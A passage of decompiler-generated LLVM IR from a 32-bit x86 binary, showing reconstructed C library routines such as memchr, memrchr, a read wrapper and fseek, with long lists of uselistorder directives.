  %v1_804fb5e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fb5e = add i32 %v1_804fb5e, 4
  %v3_804fb5e = inttoptr i32 %v2_804fb5e to i32*
  %v4_804fb5e = load i32, i32* %v3_804fb5e, align 4
  %v15_804fb5e = icmp eq i32 %v2_804faf5, %v4_804fb5e
  %v1_804fb61 = icmp eq i1 %v15_804fb5e, false
  br i1 %v1_804fb61, label %dec_label_pc_804fb34, label %dec_label_pc_804fb63

dec_label_pc_804fb63:                             ; preds = %dec_label_pc_804fb45
  %v1_804fb63 = add i32 %v1_804fb5e, 12
  store i32 %v1_804fb63, i32* %ebx.global-to-local, align 4
  %v0_804fb66 = load i32, i32* %edi.global-to-local, align 4
  %v2_804fb66 = add i32 %v0_804fb66, %v2_804faf5
  store i32 %v2_804fb66, i32* %edi.global-to-local, align 4
  %v1_804fb68 = load i32, i32* %esi.global-to-local, align 4
  %v7_804fb68 = icmp ult i32 %v1_804fb63, %v1_804fb68
  br i1 %v7_804fb68, label %dec_label_pc_804fb45, label %dec_label_pc_804fb6c

dec_label_pc_804fb6c:                             ; preds = %dec_label_pc_804fb63, %dec_label_pc_804fb34
  %v0_804fb72 = phi i32 [ -1, %dec_label_pc_804fb34 ], [ %v2_804fb66, %dec_label_pc_804fb63 ]
  store i32 %v0_804fb72, i32* %eax.global-to-local, align 4
  %v2_804fb75 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804fb75, i32* @esi, align 4
  store i32 %v0_804f5d2, i32* @edi, align 4
  store i32 %v0_804f5d1, i32* @ebp, align 4
  ret i32 %v0_804fb72

; uselistorder directives
  uselistorder i32 %v0_804fb72, { 1, 0 }
  uselistorder i32 %v2_804faf5, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_804faf2, { 1, 0 }
  uselistorder i32 %v1_804fac4, { 1, 2, 0 }
  uselistorder i32 %v0_804fac2, { 1, 0 }
  uselistorder i32 %v0_804fb3d, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_804fa88, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_804fa51, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804fa2a, { 1, 0 }
  uselistorder i32 %v1_804fa2a, { 1, 0, 2 }
  uselistorder i32 %v2_804fa28, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_804f9e5, { 1, 0 }
  uselistorder i32 %v2_804f952, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804f94c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_804f9a9, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_804f8e8, { 1, 0 }
  uselistorder i32 %v0_804f8e3, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804f8b0, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_804f8ab, { 1, 0 }
  uselistorder i8 %v2_804f8a4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804f8a4, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_804f82e, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_804f813, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_804f7de, { 1, 0 }
  uselistorder i32 %v2_804f797, { 2, 1, 0 }
  uselistorder i32 %v0_804f84d, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_804f769, { 1, 0 }
  uselistorder x86_fp80 %v3_804f74b, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_804f748, { 1, 0 }
  uselistorder x86_fp80 %v4_804f730, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_804f72a, { 1, 2, 0 }
  uselistorder i32 %v3_804f727, { 1, 0 }
  uselistorder i32 %v1_804f720, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_804f759, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_804f721, { 1, 0 }
  uselistorder i8 %v4_804f6d1, { 1, 0 }
  uselistorder i3 %v1_804f66e, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_804f5f6, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804f5ef, { 1, 0, 2 }
  uselistorder i3 %v4_804f5e8, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 4, 3, 5, 6, 7, 10, 11, 12, 2, 9, 8, 1, 0 }
  uselistorder x86_fp80* %st0.global-to-local, { 4, 2, 3, 7, 5, 6, 1, 0, 8 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 7, 6, 8, 5, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 25, 6, 7, 10, 12, 11, 13, 8, 9, 14, 17, 15, 18, 16, 19, 20, 21, 22, 23, 28, 24, 26, 27 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 11, 26, 12, 13, 27, 14, 15, 16, 17, 21, 22, 18, 19, 20, 23, 24, 25, 28, 29 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 4, 5, 2, 6, 8, 3, 7, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i8 8, { 2, 3, 4, 5, 0, 6, 7, 1 }
  uselistorder i32 160, { 2, 1, 0, 3 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i64 4294967296, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i8 45, { 2, 3, 1, 0, 4 }
  uselistorder i8 16, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i32 112, { 4, 5, 6, 2, 0, 1, 3 }
  uselistorder i32* @esp, { 24, 25, 5, 26, 27, 28, 29, 6, 30, 31, 32, 33, 9, 34, 35, 36, 10, 37, 11, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 8, 51, 12, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 7, 64, 65, 66, 67, 13, 0, 1, 68, 14, 69, 70, 71, 72, 73, 74, 15, 76, 77, 78, 79, 80, 81, 82, 17, 83, 84, 85, 86, 87, 23, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 19, 98, 99, 100, 20, 101, 16, 102, 103, 104, 105, 106, 107, 21, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 18, 121, 122, 123, 124, 125, 126, 22, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 2, 3, 4, 75 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 4, 7, 5, 6, 9, 8, 3 }
  uselistorder i32 48, { 0, 7, 4, 1, 5, 6, 10, 11, 12, 13, 14, 3, 2, 15, 16, 17, 9, 8 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 101, { 1, 0, 2 }
  uselistorder i8 48, { 12, 13, 0, 8, 1, 14, 9, 10, 2, 11, 3, 5, 6, 4, 7, 15 }
  uselistorder i32 10, { 8, 9, 14, 0, 12, 1, 15, 2, 22, 23, 24, 25, 26, 27, 3, 10, 16, 4, 6, 28, 7, 20, 21, 11, 29, 17, 18, 19, 13, 5 }
  uselistorder i32 9, { 6, 7, 12, 8, 9, 10, 11, 13, 14, 15, 16, 2, 1, 5, 3, 4, 0 }
  uselistorder i16 256, { 0, 3, 1, 2 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 4096, { 0, 8, 9, 4, 7, 1, 2, 10, 3, 5, 6 }
  uselistorder i32 13, { 0, 5, 1, 4, 2, 3 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder i32 32, { 34, 35, 36, 0, 37, 38, 39, 40, 41, 42, 43, 3, 44, 28, 46, 1, 47, 48, 19, 21, 49, 50, 51, 57, 58, 52, 53, 20, 54, 55, 56, 29, 30, 59, 22, 33, 5, 4, 6, 7, 31, 8, 9, 45, 10, 11, 12, 13, 14, 2, 16, 15, 24, 26, 18, 17, 25, 27, 23, 32 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i32 12, { 26, 27, 28, 29, 30, 31, 32, 33, 0, 20, 21, 34, 35, 48, 36, 49, 37, 1, 2, 38, 39, 9, 10, 40, 3, 98, 50, 51, 52, 4, 53, 19, 41, 5, 99, 54, 55, 64, 23, 22, 11, 6, 12, 13, 14, 15, 16, 17, 18, 25, 42, 57, 56, 43, 44, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 24, 97, 58, 59, 60, 61, 45, 46, 7, 47, 62, 8, 63 }
  uselistorder i32 6, { 8, 12, 13, 4, 5, 3, 14, 15, 0, 1, 6, 11, 9, 10, 7, 16, 2 }
  uselistorder i8 32, { 7, 0, 5, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 11, 12, 13, 6, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804fb3f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fb3d, { 1, 0 }
  uselistorder label %dec_label_pc_804fabe, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fa6b, { 1, 0 }
  uselistorder label %dec_label_pc_804fa43, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fa12, { 1, 0 }
  uselistorder label %dec_label_pc_804f9ff, { 1, 0 }
  uselistorder label %dec_label_pc_804f9e5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f9b2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f99d, { 1, 0 }
  uselistorder label %dec_label_pc_804f992, { 1, 0 }
  uselistorder label %dec_label_pc_804f919, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f90b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f8d1, { 1, 0 }
  uselistorder label %dec_label_pc_804f8a1.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804f86d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f83c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f827, { 1, 0 }
  uselistorder label %dec_label_pc_804f793, { 1, 0 }
  uselistorder label %dec_label_pc_804f76b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f769, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f759, { 1, 0 }
  uselistorder label %dec_label_pc_804f6ed, { 1, 0 }
  uselistorder label %dec_label_pc_804f616, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb7c = load i32, i32* @edi, align 4
  store i32 %v0_804fb7c, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_804fb83 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fb83, i32* %edi.global-to-local, align 4
  %v1_804fb8b = icmp eq i32 %arg3, 0
  store i1 %v1_804fb8b, i1* %zf.global-to-local, align 1
  br i1 %v1_804fb8b, label %dec_label_pc_804fb9b, label %dec_label_pc_804fb8f

dec_label_pc_804fb8f:                             ; preds = %entry
  %v2_804fb8f = call i32 @_strlen(i8* %arg1)
  %v3_804fb8f = mul i32 %v2_804fb8f, -1
  %v4_804fb8f = add i32 %v3_804fb8f, -2
  store i32 %v4_804fb8f, i32* @ecx, align 4
  %v0_804fb91 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804fb91, label %dec_label_pc_804fb8f.dec_label_pc_804fb98_crit_edge, label %dec_label_pc_804fb93

dec_label_pc_804fb8f.dec_label_pc_804fb98_crit_edge: ; preds = %dec_label_pc_804fb8f
  %v0_804fb98.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_804fb98.pre, -1
  br label %dec_label_pc_804fb98

dec_label_pc_804fb93:                             ; preds = %dec_label_pc_804fb8f
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fb98

dec_label_pc_804fb98:                             ; preds = %dec_label_pc_804fb8f.dec_label_pc_804fb98_crit_edge, %dec_label_pc_804fb93
  %v0_804fb98 = phi i32 [ %phitmp, %dec_label_pc_804fb8f.dec_label_pc_804fb98_crit_edge ], [ 0, %dec_label_pc_804fb93 ]
  %v8_804fb98 = icmp eq i32 %v0_804fb98, 0
  store i1 %v8_804fb98, i1* %zf.global-to-local, align 1
  store i32 %v0_804fb98, i32* %edi.global-to-local, align 4
  %v2_804fb9b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fb9b

dec_label_pc_804fb9b:                             ; preds = %entry, %dec_label_pc_804fb98
  %v0_804fb9c = phi i32 [ 0, %entry ], [ %v0_804fb98, %dec_label_pc_804fb98 ]
  %v2_804fb9b = phi i32 [ %v0_804fb7c, %entry ], [ %v2_804fb9b.pre, %dec_label_pc_804fb98 ]
  store i32 %v2_804fb9b, i32* @edi, align 4
  ret i32 %v0_804fb9c

; uselistorder directives
  uselistorder i32 %v0_804fb98, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804fb9b, { 1, 0 }
  uselistorder label %dec_label_pc_804fb98, { 1, 0 }
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_804fba5 = urem i32 %arg2, 256
  %v4_804fbb1 = sext i8 %arg1 to i32
  %v2_804fbb5 = add i32 %v4_804fbb1, %arg3
  %v1_804fbc77 = icmp eq i32 %arg3, 0
  br i1 %v1_804fbc77, label %dec_label_pc_804fbcf, label %dec_label_pc_804fbcb

dec_label_pc_804fbb9:                             ; preds = %dec_label_pc_804fbcb
  %v1_804fbb9 = add i32 %v0_804fbb9, -1
  %v5_804fbba = load i32, i32* @edx, align 4
  %v6_804fbba = and i32 %v5_804fbba, -256
  %v7_804fbba = or i32 %v6_804fbba, %v4_804fba5
  store i32 %v7_804fbba, i32* @edx, align 4
  %v1_804fbbe = inttoptr i32 %v1_804fbb9 to i8*
  %v2_804fbbe = load i8, i8* %v1_804fbbe, align 1
  %v15_804fbbe = icmp eq i8 %v2_804fbbe, %tmp
  br i1 %v15_804fbbe, label %dec_label_pc_804fc4c, label %dec_label_pc_804fbc6

dec_label_pc_804fbc6:                             ; preds = %dec_label_pc_804fbb9
  %v1_804fbc6 = add i32 %v0_804fbc6, -1
  %v8_804fbc6 = icmp eq i32 %v1_804fbc6, 0
  br i1 %v8_804fbc6, label %dec_label_pc_804fbcf, label %dec_label_pc_804fbcb

dec_label_pc_804fbcb:                             ; preds = %entry, %dec_label_pc_804fbc6
  %v0_804fbc6 = phi i32 [ %v1_804fbc6, %dec_label_pc_804fbc6 ], [ %arg3, %entry ]
  %v0_804fbb9 = phi i32 [ %v1_804fbb9, %dec_label_pc_804fbc6 ], [ %v2_804fbb5, %entry ]
  %v2_804fbcb = urem i32 %v0_804fbb9, 4
  %v3_804fbcb = icmp eq i32 %v2_804fbcb, 0
  %v1_804fbcd = icmp eq i1 %v3_804fbcb, false
  br i1 %v1_804fbcd, label %dec_label_pc_804fbb9, label %dec_label_pc_804fbcf

dec_label_pc_804fbcf:                             ; preds = %dec_label_pc_804fbc6, %dec_label_pc_804fbcb, %entry
  %v0_804fc32.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_804fbc6 ], [ %v0_804fbc6, %dec_label_pc_804fbcb ]
  %v0_804fbd4 = phi i32 [ %v2_804fbb5, %entry ], [ %v1_804fbb9, %dec_label_pc_804fbc6 ], [ %v0_804fbb9, %dec_label_pc_804fbcb ]
  store i32 %v0_804fbd4, i32* @ecx, align 4
  %v2_804fbd8 = mul nuw nsw i32 %v4_804fba5, 256
  %v2_804fbdb = or i32 %v2_804fbd8, %v4_804fba5
  %v2_804fbdf = mul i32 %v2_804fbdb, 65536
  %v2_804fbe2 = or i32 %v2_804fbdf, %v2_804fbdb
  %v6_804fc3552 = icmp ugt i32 %v0_804fc32.pr, 3
  br i1 %v6_804fc3552, label %dec_label_pc_804fbe6, label %dec_label_pc_804fc37

dec_label_pc_804fbe6:                             ; preds = %dec_label_pc_804fbcf, %dec_label_pc_804fc2f
  %v0_804fc2f54 = phi i32 [ %v1_804fc2f, %dec_label_pc_804fc2f ], [ %v0_804fc32.pr, %dec_label_pc_804fbcf ]
  %v0_804fbe653 = phi i32 [ %v1_804fbe6, %dec_label_pc_804fc2f ], [ %v0_804fbd4, %dec_label_pc_804fbcf ]
  %v1_804fbe6 = add i32 %v0_804fbe653, -4
  store i32 %v1_804fbe6, i32* @ecx, align 4
  %v2_804fbeb = inttoptr i32 %v1_804fbe6 to i32*
  %v3_804fbeb = load i32, i32* %v2_804fbeb, align 4
  %v4_804fbeb = xor i32 %v3_804fbeb, %v2_804fbe2
  %v1_804fbed = add i32 %v4_804fbeb, 2130640639
  %v1_804fbf3 = sub i32 -1, %v4_804fbeb
  %v2_804fbf5 = xor i32 %v1_804fbed, %v1_804fbf3
  %v1_804fbf7 = and i32 %v2_804fbf5, -2130640640
  %v2_804fbf7 = icmp eq i32 %v1_804fbf7, 0
  br i1 %v2_804fbf7, label %dec_label_pc_804fc2f, label %dec_label_pc_804fbff

dec_label_pc_804fbff:                             ; preds = %dec_label_pc_804fbe6
  %v7_804fbff = or i32 %v1_804fbf7, %v4_804fba5
  %v1_804fc03 = add i32 %v0_804fbe653, -1
  %v2_804fc06 = inttoptr i32 %v1_804fc03 to i8*
  %v3_804fc06 = load i8, i8* %v2_804fc06, align 1
  %v16_804fc06 = icmp eq i8 %v3_804fc06, %tmp
  br i1 %v16_804fc06, label %dec_label_pc_804fc4c, label %dec_label_pc_804fc0b

dec_label_pc_804fc0b:                             ; preds = %dec_label_pc_804fbff
  %v1_804fc0f = add i32 %v0_804fbe653, -2
  %v2_804fc12 = inttoptr i32 %v1_804fc0f to i8*
  %v3_804fc12 = load i8, i8* %v2_804fc12, align 1
  %v16_804fc12 = icmp eq i8 %v3_804fc12, %tmp
  br i1 %v16_804fc12, label %dec_label_pc_804fc4c, label %dec_label_pc_804fc17

dec_label_pc_804fc17:                             ; preds = %dec_label_pc_804fc0b
  %v1_804fc1b = add i32 %v0_804fbe653, -3
  %v2_804fc1e = inttoptr i32 %v1_804fc1b to i8*
  %v3_804fc1e = load i8, i8* %v2_804fc1e, align 1
  %v16_804fc1e = icmp eq i8 %v3_804fc1e, %tmp
  br i1 %v16_804fc1e, label %dec_label_pc_804fc4c, label %dec_label_pc_804fc23

dec_label_pc_804fc23:                             ; preds = %dec_label_pc_804fc17
  %v1_804fc27 = inttoptr i32 %v1_804fbe6 to i8*
  %v2_804fc27 = load i8, i8* %v1_804fc27, align 1
  %v15_804fc27 = icmp eq i8 %v2_804fc27, %tmp
  %v1_804fc29 = icmp eq i1 %v15_804fc27, false
  br i1 %v1_804fc29, label %dec_label_pc_804fc2f, label %dec_label_pc_804fc2b

dec_label_pc_804fc2b:                             ; preds = %dec_label_pc_804fc23
  br label %dec_label_pc_804fc4c

dec_label_pc_804fc2f:                             ; preds = %dec_label_pc_804fc23, %dec_label_pc_804fbe6
  %v5_804fc3c27 = phi i32 [ %v7_804fbff, %dec_label_pc_804fc23 ], [ 0, %dec_label_pc_804fbe6 ]
  %v1_804fc2f = add i32 %v0_804fc2f54, -4
  %v6_804fc35 = icmp ugt i32 %v1_804fc2f, 3
  br i1 %v6_804fc35, label %dec_label_pc_804fbe6, label %dec_label_pc_804fc37

dec_label_pc_804fc37:                             ; preds = %dec_label_pc_804fc2f, %dec_label_pc_804fbcf
  %v5_804fc3c26.lcssa = phi i32 [ %v4_804fba5, %dec_label_pc_804fbcf ], [ %v5_804fc3c27, %dec_label_pc_804fc2f ]
  %v0_804fbe6.lcssa = phi i32 [ %v0_804fbd4, %dec_label_pc_804fbcf ], [ %v1_804fbe6, %dec_label_pc_804fc2f ]
  %v0_804fc2f.lcssa = phi i32 [ %v0_804fc32.pr, %dec_label_pc_804fbcf ], [ %v1_804fc2f, %dec_label_pc_804fc2f ]
  br label %dec_label_pc_804fc44

dec_label_pc_804fc3b:                             ; preds = %dec_label_pc_804fc44
  %v1_804fc44 = add i32 %v0_804fc44, -1
  %v1_804fc3b = add i32 %v0_804fc3b, -1
  %v6_804fc3c = and i32 %v5_804fc3c, -256
  %v7_804fc3c = or i32 %v6_804fc3c, %v4_804fba5
  %v1_804fc40 = inttoptr i32 %v1_804fc3b to i8*
  %v2_804fc40 = load i8, i8* %v1_804fc40, align 1
  %v15_804fc40 = icmp eq i8 %v2_804fc40, %tmp
  br i1 %v15_804fc40, label %dec_label_pc_804fc4c, label %dec_label_pc_804fc44

dec_label_pc_804fc44:                             ; preds = %dec_label_pc_804fc3b, %dec_label_pc_804fc37
  %v5_804fc3c = phi i32 [ %v7_804fc3c, %dec_label_pc_804fc3b ], [ %v5_804fc3c26.lcssa, %dec_label_pc_804fc37 ]
  %v0_804fc3b = phi i32 [ %v1_804fc3b, %dec_label_pc_804fc3b ], [ %v0_804fbe6.lcssa, %dec_label_pc_804fc37 ]
  %v0_804fc44 = phi i32 [ %v1_804fc44, %dec_label_pc_804fc3b ], [ %v0_804fc2f.lcssa, %dec_label_pc_804fc37 ]
  %v10_804fc45 = icmp eq i32 %v0_804fc44, 0
  %v1_804fc48 = icmp eq i1 %v10_804fc45, false
  br i1 %v1_804fc48, label %dec_label_pc_804fc3b, label %dec_label_pc_804fc4a

dec_label_pc_804fc4a:                             ; preds = %dec_label_pc_804fc44
  br label %dec_label_pc_804fc4c

dec_label_pc_804fc4c:                             ; preds = %dec_label_pc_804fbb9, %dec_label_pc_804fc17, %dec_label_pc_804fc0b, %dec_label_pc_804fbff, %dec_label_pc_804fc3b, %dec_label_pc_804fc2b, %dec_label_pc_804fc4a
  %v0_804fc4f = phi i32 [ %v1_804fbe6, %dec_label_pc_804fc2b ], [ 0, %dec_label_pc_804fc4a ], [ %v1_804fc3b, %dec_label_pc_804fc3b ], [ %v1_804fc1b, %dec_label_pc_804fc17 ], [ %v1_804fc0f, %dec_label_pc_804fc0b ], [ %v1_804fc03, %dec_label_pc_804fbff ], [ %v1_804fbb9, %dec_label_pc_804fbb9 ]
  ret i32 %v0_804fc4f

; uselistorder directives
  uselistorder i32 %v0_804fc44, { 1, 0 }
  uselistorder i32 %v1_804fc2f, { 0, 2, 1 }
  uselistorder i32 %v1_804fbe6, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_804fbe653, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804fbdb, { 1, 0 }
  uselistorder i32 %v0_804fbb9, { 1, 0, 2 }
  uselistorder i32 %v2_804fbb5, { 1, 0 }
  uselistorder i32 %v4_804fba5, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -3, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32 -2, { 3, 7, 13, 14, 0, 1, 8, 9, 10, 15, 19, 16, 17, 18, 4, 6, 5, 11, 2, 12 }
  uselistorder i32 65536, { 1, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11, 12, 0, 13, 14, 15, 17, 20, 16, 18, 19 }
  uselistorder i32 -256, { 14, 15, 16, 17, 18, 19, 20, 21, 10, 22, 23, 24, 44, 25, 26, 27, 28, 29, 30, 31, 0, 32, 33, 60, 2, 45, 1, 46, 11, 34, 47, 49, 61, 4, 39, 38, 3, 50, 51, 52, 53, 7, 54, 5, 55, 6, 56, 58, 9, 41, 40, 8, 12, 42, 13, 62, 37, 48, 35, 36, 43, 57, 59 }
  uselistorder i32 256, { 5, 6, 7, 0, 1, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 46, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 47, 30, 31, 32, 33, 34, 45, 35, 48, 52, 49, 36, 37, 53, 38, 39, 4, 50, 51, 3, 40, 41, 42, 43, 44 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fc4c, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804fbe6, { 1, 0 }
  uselistorder label %dec_label_pc_804fbcf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbcb, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc50 = load i32, i32* @edi, align 4
  store i32 %v0_804fc50, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fc60 = load i32, i32* @ebx, align 4
  %v4_804fc68 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804fc60, i32* @ebx, align 4
  store i32 %v4_804fc68, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804fc68, -4095
  br i1 %tmp, label %dec_label_pc_804fc80, label %dec_label_pc_804fc74

dec_label_pc_804fc74:                             ; preds = %entry
  %v1_804fc74 = call i32 @__errno_location(i32 %v0_804fc60)
  %v0_804fc79 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fc79 = sub i32 0, %v0_804fc79
  %v2_804fc7b = inttoptr i32 %v1_804fc74 to i32*
  store i32 %v1_804fc79, i32* %v2_804fc7b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fc80

dec_label_pc_804fc80:                             ; preds = %entry, %dec_label_pc_804fc74
  %v0_804fc81 = phi i32 [ %v4_804fc68, %entry ], [ -1, %dec_label_pc_804fc74 ]
  %v2_804fc84 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc84, i32* @edi, align 4
  ret i32 %v0_804fc81

; uselistorder directives
  uselistorder i32 %v4_804fc68, { 1, 0, 2 }
  uselistorder i32 %v0_804fc60, { 1, 0 }
  uselistorder label %dec_label_pc_804fc80, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804fc93 = ashr i32 %arg2, 31
  %v4_804fc9a = inttoptr i32 %arg1 to i16*
  %v5_804fc9a = call i32 @__GI_fseeko64(i16* %v4_804fc9a, i32 %arg2, i32 %v1_804fc93, i32 %arg3)
  ret i32 %v5_804fc9a
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_804fca4 = load i32, i32* @ebp, align 4
  %v0_804fca5 = load i32, i32* @edi, align 4
  %v0_804fca6 = load i32, i32* @esi, align 4
  %v0_804fca7 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_804fcb7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804fcb7, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_804fcdb, label %dec_label_pc_804fcc8

dec_label_pc_804fcc8:                             ; preds = %entry
  %v1_804fcc8 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_804fcc8, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_804fcd0 = inttoptr i32 %v1_804fcc8 to i32*
  store i32 22, i32* %v1_804fcd0, align 4
  br label %dec_label_pc_804fd81

dec_label_pc_804fcdb:                             ; preds = %entry
  %v1_804fcdb = add i32 %v4_804fcb7, 52
